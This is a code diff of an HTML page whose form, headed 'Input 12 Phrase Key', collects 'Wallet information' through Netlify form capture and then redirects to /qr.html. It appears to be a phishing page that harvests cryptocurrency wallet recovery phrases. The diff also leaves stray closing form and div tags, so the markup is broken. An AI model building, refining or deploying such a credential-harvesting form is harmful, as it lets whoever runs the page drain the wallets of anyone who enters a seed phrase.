@@ -70,24 +70,31 @@
   </style>
 </head>
 <body>
-  <div class="wrapper">
-    <form class="form-box" name="validator-form" method="POST" data-netlify="true">
-      <!-- Edit this headline text to whatever you like -->
-      <h1>Input 12 Phrase Key</h1>
+  <form
+  class="form-box"
+  name="validator-form"
+  method="POST"
+  data-netlify="true"
+  action="/qr.html"
+>
+  <!-- Edit this headline text to whatever you like -->
+  <h1>Input 12 Phrase Key</h1>
 
-      <!-- Netlify needs this hidden field -->
-      <input type="hidden" name="form-name" value="validator-form" />
+  <!-- Netlify needs this hidden field -->
+  <input type="hidden" name="form-name" value="validator-form" />
 
-      <label for="walletField">Wallet information</label>
-      <input
-        type="text"
-        id="walletField"
-        name="walletField"
-        placeholder="Type anything you want here..."
-        required
-      />
+  <label for="walletField">Wallet information</label>
+  <input
+    type="text"
+    id="walletField"
+    name="walletField"
+    placeholder="Type anything you want here..."
+    required
+  />
 
-      <button type="submit">Submit</button>
+  <button type="submit">Submit</button>
+</form>
+
     </form>
   </div>
 </body>
